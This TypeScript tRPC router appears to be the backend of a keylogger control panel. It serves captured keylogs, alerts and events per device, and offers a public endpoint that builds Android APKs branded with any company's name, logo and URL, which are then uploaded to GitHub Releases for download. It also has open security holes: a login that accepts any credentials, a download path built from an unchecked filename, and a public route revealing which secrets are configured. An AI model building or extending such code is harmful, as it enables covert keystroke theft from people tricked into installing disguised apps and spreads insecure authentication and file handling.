import z from "zod";
import fs from "fs";
import path from "path";

import { storagePut } from "./storage";
import { TRPCError } from "@trpc/server";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
import { startKeylogSimulator } from "./keylogSimulator";
import { buildCustomAPK } from "./apk-builder";
import { generateAPKWrapper } from "./apk-wrapper-generator";
import { generateSimpleAPKWrapper } from "./apk-wrapper-simple";
import { buildProfessionalAPK } from "./apk-builder-professional";
import { buildSimpleProductionAPK } from "./apk-builder-simple-production";
import { buildCustomizedAPK } from "./apk-builder-customized";
import { buildAdvancedAPK } from "./apk-builder-advanced";
import { generateMemoryAPKUrl } from "./apk-builder-memory";
import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
import { sdk } from "./_core/sdk";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    login: publicProcedure
      .input(z.object({
        email: z.string().email(),
        password: z.string().min(1),
      }))
      .mutation(async ({ input, ctx }) => {
        // Simple authentication: accept any email/password combination
        // Generate a numeric userId based on email hash
        const emailHash = input.email.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
        const userId = Math.abs(emailHash % 1000000); // Ensure it's a positive number
        
        try {
          // Create a session token
          const sessionToken = await sdk.createSessionToken(userId, input.email);
          
          // Set the session cookie
          const cookieOptions = getSessionCookieOptions(ctx.req);
          ctx.res.cookie(COOKIE_NAME, sessionToken, cookieOptions);
          
          return {
            success: true,
            user: {
              id: userId,
              email: input.email,
              name: input.email.split('@')[0],
            },
          };
        } catch (error) {
          console.error('Login error:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao fazer login',
          });
        }
      }),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    deleted: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getDeletedKeylogs(input.deviceId);
      }),
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await deleteKeylog(input.keylogId);
      }),
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await restoreKeylog(input.keylogId);
      }),
  }),

  alerts: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }))
      .query(async ({ input }) => {
        return await getAlerts();
      }),
  }),

  events: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }))
      .query(async ({ input }) => {
        return await getEvents();
      }),
  }),
  apk: router({
    testEnv: publicProcedure
      .query(() => {
        return {
          GITHUB_TOKEN: process.env.GITHUB_TOKEN ? 'Present' : 'Missing',
          GITHUB_REPO_URL: process.env.GITHUB_REPO_URL || 'Missing',
          NODE_ENV: process.env.NODE_ENV,
          APP_ENV: process.env.APP_ENV,
        };
      }),
    build: publicProcedure
      .input(z.object({
        companyName: z.string().min(1),
        companyUrl: z.string().url(),
        logoUrl: z.string().url().optional(),
      }))
      .mutation(async ({ input }) => {
        try {
          console.log('[ROUTER] APK build requested:', { companyName: input.companyName, companyUrl: input.companyUrl });
          
          // Use customized APK builder to change app name and package name
          console.log('[ROUTER] Building APK with customized builder...');
          const result = await buildCustomizedAPK({
            appName: input.companyName,
            appUrl: input.companyUrl,
            logoUrl: input.logoUrl,
          });
          
          console.log('[ROUTER] Customized builder result:', { success: result.success, downloadUrl: result.downloadUrl, filename: result.filename });

          if (!result.success || !result.downloadUrl) {
            throw new Error(result.error || "Erro ao gerar APK");
          }

          // Extract filename from download URL
          const filename = result.downloadUrl.split('/').pop() || 'app.apk';
          console.log('[ROUTER] Extracted filename:', filename);
          
          // Try to upload to GitHub Releases if token is available
          let finalDownloadUrl = result.downloadUrl; // Start with local URL as fallback
          
          console.log('[ROUTER] Using local download URL (GitHub is for backup only)');
          console.log('[ROUTER] Local URL:', result.downloadUrl);
          finalDownloadUrl = result.downloadUrl;
          
          // Attempt GitHub upload in background (non-blocking) for backup
          if (process.env.GITHUB_TOKEN && process.env.GITHUB_REPO_URL && result.apkPath) {
            console.log('[ROUTER] Attempting GitHub upload in background...');
            const repoUrl = process.env.GITHUB_REPO_URL;
            const { owner, repo } = parseGitHubUrl(repoUrl);
            uploadToGitHubRelease({
              owner,
              repo,
              token: process.env.GITHUB_TOKEN,
              appName: input.companyName,
              filePath: result.apkPath,
            }).then((githubUrl) => {
              console.log('[ROUTER] ✓ GitHub backup upload successful:', githubUrl);
            }).catch((err) => {
              console.warn('[ROUTER] GitHub backup upload failed (non-blocking):', err instanceof Error ? err.message : String(err));
            });
          }
          
            console.log('[ROUTER] Final download URL:', finalDownloadUrl);
            console.log('[ROUTER] Using', finalDownloadUrl.includes('github.com') ? 'GitHub' : 'local', 'download URL');
            
            return {
              success: true,
              downloadUrl: finalDownloadUrl,
              apkPath: result.apkPath,
              filename: filename,
              message: "APK gerado com sucesso!",
            };
        } catch (error) {
          console.error("Erro ao gerar APK:", error);
          throw new Error(`Erro ao gerar APK: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
    
    download: publicProcedure
      .input(z.object({
        filename: z.string().min(1),
      }))
      .query(async ({ input }) => {
        try {
          console.log('[APK] Download requested for:', input.filename);
          const filePath = path.join(process.cwd(), 'public', 'apks', input.filename);
          
          if (!fs.existsSync(filePath)) {
            throw new Error('Arquivo não encontrado');
          }
          
          return {
            success: true,
            filePath: filePath,
          };
        } catch (error) {
          console.error('[APK] Download error:', error);
          throw new Error(`Erro ao baixar APK: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
  }),
});
